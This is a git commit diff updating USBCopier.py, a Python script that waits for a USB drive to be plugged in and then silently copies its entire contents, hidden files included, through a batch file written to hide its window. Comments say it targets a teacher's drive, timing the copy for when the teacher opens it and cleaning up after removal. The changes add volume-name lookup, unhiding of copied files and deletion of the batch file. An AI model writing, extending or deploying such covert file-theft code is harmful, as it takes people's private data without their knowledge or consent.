8f9e6247c8005cf4c24fdf9a5012daf86dad62e5
WhitemuTeam <WhitemuTeam@outlok.com>
2021-11-06 14:40:01 +0800

    3.0: 更改文件保存方式和设置文件

--- USBCopier.py
+++ USBCopier.py
@@ -1,5 +1,5 @@
 #pip install psutil
-import psutil,json,os
+import psutil,os
 from time import sleep
 
 #新建文件夹以存放文件
@@ -9,18 +9,33 @@ try:
 except:
     pass
 dir=dir+r'\files'
+os.chdir(dir)
 
 #获取配置信息(wait:等待时间)
 try:
-    with open('setting.json','r') as f:
+    with open('setting.txt','r') as f:
         file=f.read()
-        setting=json.loads(file)
-        wait=int(setting['wait'])
+        wait=int(file)
 except:
     wait=1 #默认等待时间
 
 #获取磁盘信息
 old_disk=psutil.disk_partitions()
+
+#获取分区名
+def getname(copydir):
+    print(dir)
+    ml='dir '+copydir+' ->temp.txt'
+    os.system(ml)
+    with open('temp.txt','r') as f:
+        name=f.readlines()[0].split('是 ')[1].split('\n')[0]
+    os.remove('temp.txt')
+    try:
+        os.chdir(dir)
+        os.mkdir(name)
+    except:
+        pass
+    return name
 
 #写一个bat隐藏复制时的窗口
 def cbat(copydir,dir):
@@ -31,6 +46,8 @@ def cbat(copydir,dir):
     print(':CmdBegin',file=bat)
     print(' ',file=bat)
     ml='xcopy '+copydir+' '+dir+' /E /H /R'
+    print(ml,file=bat)
+    ml='attrib -H '+dir+' -s'
     print(ml,file=bat)
     bat.close()
 
@@ -43,15 +60,20 @@ while True:
             new_disk.remove(i)
         print('开始复制...')
         copydir=str(new_disk[0][0])
+        name=getname(copydir)
+        dir=dir+'\\'+name
         print(copydir)
         sleep(wait) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
         cbat(copydir,dir)
         os.system('copy.bat')
-        #os.remove('copy.bat')
         print('bat开始运行...')
         old_disk=psutil.disk_partitions()
     elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
         old_disk=psutil.disk_partitions()
+        try:
+            os.remove('copy.bat')
+        except:
+            pass
         print('waiting...')
         sleep(wait)
     else:
